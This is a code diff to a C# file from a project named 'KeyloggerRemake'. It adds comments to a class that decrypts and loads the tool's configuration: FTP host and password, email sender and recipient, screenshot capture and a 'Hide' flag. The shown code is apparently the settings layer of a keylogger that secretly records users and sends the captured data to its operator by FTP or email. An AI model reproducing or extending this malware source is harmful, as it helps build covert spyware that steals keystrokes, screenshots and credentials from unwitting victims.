@@ -11,15 +11,18 @@ namespace KeyloggerRemake
 {
     class classJsonObj
     {
-        static String strEncryptedKey = "";
+        static String strEncryptedKey = ""; //Used to store the encrypted key to decrypt
 
+        //Class used to deserialize the Json using Bson
         public class classJson
         {
+            //The json object will have access to the following objects and their fields:
             public FTP FTP { get; set; }
             public Email Email { get; set; }
             public Check Check { get; set; }
         }
 
+        //Class used to store the FTP values
         public class FTP
         {
             public string Host { get; set; }
@@ -27,6 +30,7 @@ namespace KeyloggerRemake
             public string Pass { get; set; }
         }
 
+        //Class used to store the Email values
         public class Email
         {
             public string Host { get; set; }
@@ -37,6 +41,7 @@ namespace KeyloggerRemake
             public string ToEmail { get; set; }
         }
 
+        //Class used to store the Check values
         public class Check
         {
             public bool TakeScreenshot { get; set; }
@@ -47,11 +52,12 @@ namespace KeyloggerRemake
             public bool Hide { get; set; }
         }
 
+        //To initialize/get the decrypted json as an object
         public static classJson initializeObj()
         {
-            strEncryptedKey = classGetEncryption.getEncryptedKey();
+            strEncryptedKey = classGetEncryption.getEncryptedKey(); //Grabs the encrypted key
 
-            return classGetEncryption.decryptBson(strEncryptedKey);
+            return classGetEncryption.decryptBson(strEncryptedKey); //Decrypts the encrypted key and returns it as an object of classJson
         }
     }
 }
